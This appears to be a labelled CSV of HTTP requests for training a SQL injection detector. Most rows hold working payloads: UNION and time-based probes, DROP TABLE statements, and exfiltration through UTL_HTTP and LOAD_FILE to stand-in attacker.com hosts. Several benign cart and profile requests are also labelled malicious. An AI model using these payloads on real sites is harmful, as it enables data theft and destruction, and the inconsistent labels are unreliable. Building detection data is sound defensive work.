RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
GET,/rest/products/2,id=%2527%2BAND%2BUTL_HTTP.REQUEST%2528%2527http%253A%252F%252Fexfil-372.attacker.com%252F%2527%257C%257C%2540%2540hostname%2529%2B,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,386,16,130,0,1,95,23,16,13,0.1575,0,47,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/4,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,334,17,0,15,1,0,9,0,0,0.2812,0,19,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,category=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-812.attacker.com%2F%27%7C%7Cuser%28%29%29--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,362,21,101,0,1,66,22,13,0,0.1803,0,46,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/20,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,262,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,query=%2527%253B%2BdrOp%2BTable%2BcONfIG%253b%2523,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,259,21,50,0,1,30,10,7,4,0.1408,1,29,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/11,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 3}",,malicious,sqli,306,18,0,15,1,0,9,0,0,0.2727,0,20,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+%40%40hostname%29%2C%27.exfil-870.attacker.com%5Cabc%27%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,361,21,140,0,1,90,33,22,0,0.205,5,46,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27+AND+%27c%27%3D%27c%27+AND+WAITFOR+DELAY+%270%3A0%3A7%27--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,256,16,64,0,1,41,19,10,0,0.2375,0,32,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/4,id=%27%3B+Update+prODUCtS+SeT+pRIce%3D%274779%27+whERe+Id%3D1%3B%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,309,16,70,0,1,49,18,9,0,0.2093,0,35,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%27%3B+DROP+TABLE+products%3B%23,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,241,21,37,0,1,24,10,4,0,0.1724,1,27,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/7'+AND+TRUE+AND+SLEEP(7)+,,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,220,40,0,0,0,0,11,0,0,0.275,2,25,False,False,False,False,3,True,False,False,False,4,20,Tuesday
GET,/rest/products/7,id=%2527%2BAND%2BTRUE%2BAND%2BSLEEP%25287%2529%2B,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,240,16,49,0,1,30,11,8,3,0.1692,2,29,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/8,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-180.attacker.com%5Cabc%27%29%29%29--,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,334,16,129,0,1,86,31,20,0,0.2138,5,42,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/12,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,sqli,269,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/2,id=%27+UNION+SELECT+NULL%2C+NULL%2C+user%28%29%2C+NULL%2C+NULL%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,321,16,65,0,1,46,18,8,0,0.2222,2,28,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%2527%253b%2520%2544%2552%254f%2550%2520%2554%2541%2542%254c%2545%2520%256f%2572%2564%2565%2572%2573%253b%2523,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,335,16,113,0,1,66,25,22,22,0.1938,0,24,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/10,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,308,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/6,id=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254c%2545%2543%2554%2520%254c%254f%2541%2544%255f%2546%2549%254c%2545%2528%2543%254f%254e%2543%2541%2554%2528%2527%255c%255c%2527%252c%2528%2553%2545%254c%2545%2543%2554%2520%2575%2573%2565%2572%2528%2529%2529%252c%2527%252e%2565%2578%2566%2569%256c%252d%2539%2534%2534%252e%2561%2574%2574%2561%2563%256b%2565%2572%252e%2563%256f%256d%255c%2561%2562%2563%2527%2529%2529%2529%252f%252a,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,689,16,433,0,1,258,89,86,86,0.1982,0,26,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/10,id=%2527%2520%2575%254e%2569%254f%254e%2520%2573%2565%254c%2545%2563%2574%2520%256e%2555%254c%256c%252c%2520%254e%2575%254c%254c%252c%2520%254e%2575%254c%254c%252c%2520%2564%2561%2574%2541%2562%2541%2553%2545%2528%2529%252c%2520%254e%2555%254c%254c%2520,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,510,17,253,0,1,150,53,50,50,0.1963,0,24,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2BAND%2BUTL_HTTP.REQUEST%2528%2527http%253A%252F%252Fexfil-996.attacker.com%252F%2527%257C%257C%2540%2540hostname%2529%2B,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,400,21,132,0,1,95,23,16,13,0.1503,0,48,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,339,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,303,21,97,0,1,59,22,16,0,0.1864,2,41,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/7,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,283,16,90,0,1,59,20,14,0,0.1887,2,35,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%2527%2520%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%2576%2565%2572%2573%2569%256f%256e%2528%2529%252c%2520%254e%2555%254c%254c%2523,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,411,21,161,0,1,93,34,31,31,0.1868,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%27+AND+TRUE+AND+WAITFOR+DELAY+%270%3A0%3A3%27%2F%2A,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,198,21,61,0,1,38,16,7,0,0.1951,0,34,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+aND+%27R%27%3D%27R%27+AnD+WAItFoR+dElAY+%270%3A0%3A5%27--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,303,21,66,0,1,41,19,10,0,0.2184,0,32,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/14,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 3}",,malicious,sqli,261,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,data=%2527%2520%2541%254e%2544%2520%2538%2535%253d%2537%2537%2520%2541%254e%2544%2520%2553%254c%2545%2545%2550%2528%2537%2529%252d%252d,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,344,21,135,0,1,78,29,26,26,0.1859,0,23,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%2527%2BAND%2B95%253D46%2BAND%2BWAITFOR%2BDELAY%2B%25270%253A0%253A6%2527--,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,288,21,84,0,1,51,15,12,6,0.1429,0,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%27+AND+%27m%27%3D%27m%27+AND+SLEEP%287%29+,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,299,21,48,0,1,27,16,8,0,0.2319,2,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/5,id=%27%3B+INSERT+INTO+orders+%28product_name%29+VALUES+%28%27fuzz_test_802%27%29%3B--,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,290,16,85,0,1,64,21,9,0,0.2079,1,40,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/8,id=%27%3B+UPDATE+products+SET+status%3D%27hacked_pw%27+WHERE+id%3D1%3B--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,328,16,72,0,1,55,17,7,0,0.1932,0,36,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,295,16,91,0,1,60,20,14,0,0.1869,2,37,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%27+UNION+SELECT+user%28%29%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL+,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,289,21,91,0,1,64,24,10,0,0.2143,2,28,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%27%3B+DROP+TABLE+users%3B%23,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,265,21,38,0,1,21,10,4,0,0.1695,1,29,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/12,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,261,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,query=%27+UNION+SELECT+NULL%2C+NULL%2C+database%28%29%2C+NULL%2C+NULL%2C+NULL%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,333,21,83,0,1,57,21,10,0,0.2019,2,33,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%2527%253B%2BINSERT%2BINTO%2Bconfig%2B%2528name%2529%2BVALUES%2B%2528%2527fuzz_test_491%2527%2529%253B%2B,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,366,21,110,0,1,73,21,16,9,0.1603,1,41,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+OR+TRUE%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,210,16,17,0,1,10,7,2,0,0.2121,0,22,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%27%3B+DROP+TABLE+products%3B%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,299,21,42,0,1,25,11,5,0,0.1746,1,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%2527%253B%2BINSERT%2BINTO%2Borders%2B%2528name%2529%2BVALUES%2B%2528%2527fuzz_test_467%2527%2529%253B--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,354,21,109,0,1,74,20,15,9,0.1538,1,40,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/10,id=%27+AND+1%3D3+AND+WAITFOR+DELAY+%270%3A0%3A7%27--,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,302,17,52,0,1,37,15,6,0,0.2174,0,32,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/16,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,335,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user3@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,370,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/5,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-731.attacker.com%5Cabc%27%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,338,16,133,0,1,86,33,22,0,0.2215,5,42,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+version%28%29%29%2C%27.exfil-124.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,389,16,133,0,1,88,32,21,0,0.2148,5,45,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/2,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+database%28%29%29%2C%27.exfil-706.attacker.com%5Cabc%27%29%29%29--,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,355,16,133,0,1,90,31,20,0,0.2081,5,42,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/2,id=%27+AND+%27y%27%3D%27y%27+AND+WAITFOR+DELAY+%270%3A0%3A6%27%2F%2A,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,273,16,68,0,1,41,21,12,0,0.25,0,32,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+AnD+UTl_HtTp.requeSt%28%27hTtp%3A%2F%2FexFiL-791.ATTACkeR.CoM%2F%27%7C%7C%40%40HosTnaMe%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,364,21,103,0,1,70,24,15,0,0.1935,0,43,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%27%3B+DROP+TABLE+orders%3B--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,295,21,34,0,1,23,9,3,0,0.1636,1,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,374,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,data=%2527%2Band%2B%2528sElect%2BExtRActvALuE%25281%252ccONCAt%25280X7e%252C%2528DaTAbasE%2528%2529%2529%252c0X7e%2529%2529%2529--,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,320,21,130,0,1,91,20,17,14,0.1325,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%27+UNION+SELECT+NULL%2C+NULL%2C+database%28%29--,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,297,21,54,0,1,39,13,5,0,0.1733,2,33,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%2527%2520%2541%254e%2544%2520%2527%2566%2527%253d%2527%2566%2527%2520%2541%254e%2544%2520%2553%254c%2545%2545%2550%2528%2534%2529%2523,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,398,21,141,0,1,81,30,27,27,0.1852,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/6,id=%27%3B+INSERT+INTO+orders+%28email%29+VALUES+%28%27fuzz_test_987%27%29%3B+,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,317,16,77,0,1,56,21,9,0,0.2258,1,38,False,False,False,True,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/17,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,262,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,category=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,347,21,97,0,1,56,22,16,0,0.1864,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
